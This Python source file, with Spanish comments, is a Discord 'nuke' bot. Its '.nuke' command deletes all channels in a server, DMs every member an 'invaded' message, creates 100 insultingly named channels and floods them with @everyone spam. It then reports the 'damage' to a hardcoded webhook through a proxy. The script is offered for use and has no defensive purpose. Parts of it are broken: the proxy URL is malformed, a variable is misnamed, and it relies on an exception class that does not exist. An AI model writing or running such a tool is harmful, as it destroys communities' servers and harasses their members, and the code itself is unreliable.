import discord
from discord.ext import commands
import random
import asyncio
import time
import os
import aiohttp

# --- CONFIGURACIÓN DE INTENTOS ---
intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix='.', intents=intents)

print("El arma está cargada y lista para el lanzamiento.")

channel_names = [
    "ur a bitchh", "get rekt", "nuked by Bigm", "chaos incoming",
    "owo explosion", "server wipe", "BYE BYE", "The Void", "Bigm Was Here",
    "RATIO"
]

TARGET_CHANNELS = 100
TARGET_PINGS = 1000
CONCURRENCY_LIMIT = 25
LOG_CHANNEL_NAME = "﹗logs"
WEBHOOK_URL = "https://discord.com/api/webhooks/1438649141851979776/p8c52p4cNv7SGBXkz0L_liPgD2_3D5p2TjDZfQTRTGAH2FyNO452lUHmqIAyrG4m0cyp"  # <-- cámbialo si quieres
MESSAGE_TO_MEMBER = "You have been invaded by voidxn"

# Configuración del proxy
PROXY_URL = "http//:138.201.245.91:8080"  # Reemplaza con tu proxy
# Ejemplo: PROXY_URL = "http://108.162.192.113"

semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

async def console_clear_task():
    while True:
        await asyncio.sleep(2)
        clear_console()
        print(f"[{time.strftime('%H:%M:%S')}] Consola limpiada. Bot activo.")

@bot.event
async def on_ready():
    print(f'¡Conectado! {bot.user.name} ha tomado el control del mainframe.')
    bot.loop.create_task(console_clear_task())

async def send_message_to_members(guild, message):
    for member in guild.members:
        try:
            dm = await member.create_dm()
            await dm.send(message)
        except:
            pass

async def create_log_channel_and_send_embed(guild, ctx, start_time, duration):
    log_channel = discord.utils.get(guild.channels, name=LOG_CHANNEL_NAME)
    if not log_channel:
        try:
            log_channel = await guild.create_text_channel(LOG_CHANNEL_NAME)
        except:
            return

    embed = discord.Embed(
        title="SERVER DAMAGE REPORT",
        description=f"Nuke command executed.",
        color=discord.Color.red()
    )
    embed.add_field(name="Server", value=f"{guild.name}", inline=False)
    embed.add_field(name="Initiator", value=f"{ctx.author.mention}", inline=True)
    embed.add_field(name="Duration", value=f"{duration:.2f}s", inline=True)

    await log_channel.send(embed=embed)

async def send_embed_via_webhook(guild, ctx, start_time, duration):
    data = {
        "username": "Nuke Bot",
        "embeds": [{
            "title": "SERVER DAMAGE REPORT",
            "description": "Nuke executed.",
            "color": 16711680
        }]
    }
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(WEBHOOK_URL, json=data, proxy=PROXY_URL) as response:
                if response.status != 204:
                    print(f"Error al enviar webhook: {response.status}")
    except Exception as e:
        print(f"Error al enviar webhook: {e}")

@bot.command(name='nuke')
@commands.has_permissions(administrator=True)
async def create_and_delete_channels(ctx):
    start_time = time.time()

    await send_message_to_members(ctx.guild, MESSAGE_TO_MEMBERS)

    delete_tasks = [channel.delete() for channel in ctx.guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    async def create_and_ping(i):
        async with semaphore:
            try:
                name = random.choice(channel_names)
                ch = await ctx.guild.create_text_channel(f'{name}-{i}')
                for _ in range(TARGET_PINGS // TARGET_CHANNELS):
                    try:
                        await ch.send('@everyone nuked by Bigm https://discord.gg/Duhk3RTsfA')
                    except discord.errors.RateLimitError as e:
                        print(f"RateLimitError: Esperando {e.retry_after} segundos.")
                        await asyncio.sleep(e.retry_after)
                        await ch.send('@everyone nuked by Bigm https://discord.gg/Duhk3RTsfA')  # Reintenta enviar
            except Exception as e:
                print(f"Error al crear/enviar mensaje: {e}")

    tasks = [create_and_ping(i) for i in range(1, TARGET_CHANNELS + 1)]
    await asyncio.gather(*tasks, return_exceptions=True)

    duration = time.time() - start_time
    await create_log_channel_and_send_embed(ctx.guild, ctx, start_time, duration)
    await send_embed_via_webhook(ctx.guild, ctx, start_time, duration)

    await ctx.send(f'Nuke complete in {duration:.2f}s.')

print("Bot is running...")

bot.run(os.getenv("TOKEN"))
